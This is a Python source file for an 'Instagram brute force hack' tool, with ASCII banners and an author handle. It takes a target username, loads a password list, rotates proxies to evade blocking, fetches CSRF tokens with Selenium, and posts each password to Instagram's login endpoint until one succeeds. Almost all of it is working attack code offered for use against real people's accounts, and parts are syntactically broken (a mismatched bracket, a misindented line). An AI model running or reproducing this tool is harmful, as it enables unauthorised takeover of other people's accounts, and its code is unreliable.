
'''
TODO LIST:
	Fix and make proxy function better
	Sort code again
	Add help function to all "Yes/no" questions
	Add help  function to "Press enter to exit input"
'''
import requests
import json
import time
import os
import random
import sys
from selenium import webdriver

# Help function
def Input(text):
    value = ''
    if sys.version_info.major > 2:
        value = input(text)
    else:
        value = raw_input(text)
    return str(value)

# The main class
class Instabrute():
    def __init__(self, username, passwordsFile='password.txt'):
        self.username = username
        self.CurrentProxy = ''
        self.UsedProxys = []
        self.passwordsFile = passwordsFile

        # Check if passwords file exists
        self.loadPasswords()
        # Check if username exists
        self.IsUserExists()

        UseProxy = Input('[*] Do you want to use a proxy (y/n): ').upper()
        if (UseProxy == 'Y' or UseProxy == 'YES'):
            self.randomProxy()

    # Check if password file exists and check if it contains passwords
    def loadPasswords(self):
        if os.path.isfile(self.passwordsFile):
            with open(self.passwordsFile) as f:
                self.passwords = f.read().splitlines()
                passwordsNumber = len(self.passwords)
                if (passwordsNumber > 0):
                    print('[*] %s Passwords loaded successfully' % passwordsNumber)
                else:
                    print('Password file is empty. Please add passwords to it.')
                    Input('[*] Press enter to exit')
                    exit()
        else:
            print('Please create a passwords file named "%s"' % self.passwordsFile)
            Input('[*] Press enter to exit')
            exit()

    # Choose a random proxy from a list of proxies
    def randomProxy(self):
        plist = open('proxylist.txt').read().splitlines()
        proxy = random.choice(plist)

        if proxy not in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        try:
            print('')
            print('[*] Checking new IP...')
            print('[*] Your public IP: %s' % requests.get('http://myexternalip.com/raw', proxies={"http": proxy, "https": proxy}, timeout=10.0).text)
        except Exception as e:
            print('[*] Can\'t reach proxy "%s"' % proxy)
        print('')

    # Check if the username exists on the Instagram server
    def IsUserExists(self):
        r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
        if r.status_code == 404:
            print('[*] User named "%s" not found' % self.username)
            Input('[*] Press enter to exit')
            exit()
        elif r.status_code == 200:
            return True

    # Try to login with a password
    def Login(self, password):
        sess = requests.Session()

        if len(self.CurrentProxy) > 0:
            sess.proxies = {"http": self.CurrentProxy, "https": self.CurrentProxy}

        # Build request headers
        sess.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '', 's_network': '', 'ds_user_id': ''})
        sess.headers.update({
            'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
            'x-instagram-ajax': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'origin': 'https://www.instagram.com',
            'ContentType': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Referer': 'https://www.instagram.com',
            'authority': 'www.instagram.com',
            'Host': 'www.instagram.com',
            'Accept-Language': 'en-US;q=0.6,en;q=0.4',
            'Accept-Encoding': 'gzip, deflate'
        })

        # Initialize the Selenium WebDriver
        browser = webdriver.Chrome()
        
        # Open the Instagram website
        browser.get('https://www.instagram.com')

        # Get the csrf token automatically
        csrf_token = browser.execute_script("return document.querySelector('input[name=\"csrf_token\"]').value")

        # Update the session's headers with the csrf token
        sess.headers.update({'X-CSRFToken': csrf_token})

        # Update token after enter to the site
        r = sess.get('https://www.instagram.com/')
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})

        # Update token after login to the site
        r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken'])

        # Parse the response
 data = json.loads(r.text)
        if data['status'] == 'fail':
            print(data['message'])

            UseProxy = Input('[*] Do you want to use a proxy (y/n): ').upper()
            if UseProxy == 'Y' or UseProxy == 'YES':
                print('[$] Try to use proxy after fail.')
                self.randomProxy()  # Verifique isso, pode conter bugs
            return False

        # Retorna a sessão se a senha estiver correta
        if data['authenticated'] == True:
            return sess
        else:
            return False

print("""\033[32;1m
   mm.           dM8
   YMMMb.       dMM8
    YMMMMb     dMMM'
     YMMMb   dMMMP
       YMMM  MMM'
          MbdMP
      .dMMMMMM.P   -=[INSTAGRAM BRUTE FORCE HACK]=-
     dMM  MMMMMMM  -=[Wrench]=-
     8MMMMMMMMMMI  -=[DEDSECt]=-
      YMMMMMMMMM   -=[INSTAGRAM: jeanpseven]=-
        MMMMMMP
       MxM .mmm


""")

print("""\033[31;1m

 /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
| $$__  $$| $$_____/| $$__  $$ /$$__  $$| $$_____/ /$$__  $$
| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \__/
| $$  | $$| $$$$$   | $$  | $$|  $$$$$$ | $$$$$   | $$      
| $$  | $$| $$__/   | $$  | $$ \____  $$| $$__/   | $$      
| $$  | $$| $$      | $$  | $$ /$$  \ $$| $$      | $$    $$
| $$$$$$$/| $$$$$$$$| $$$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
|_______/ |________/|_______/  \______/ |________/ \______/ 

""")
instabrute = Instabrute(Input('\033[32;1mPlease enter a username: '))

try:
    delayLoop = int(Input('\033[36;1m[*] Please add a delay between the brute force actions (in seconds): '))
except Exception as e:
    print('[*] Error, the software uses the default value "4"')
    delayLoop = 4
print('')

for password in instabrute.passwords:
    sess = instabrute.Login(password)
    if sess:
        print('[*] Login success %s' % [instabrute.username, password])
    else:
        print('[*] Password incorrect [%s]' % password)

    try:
        time.sleep(delayLoop)
    except KeyboardInterrupt:
        WantToExit = str(Input('Type y/n to exit: ')).upper()
        if WantToExit == 'Y' or WantToExit == 'YES':
            exit()
        else:
            continue
		
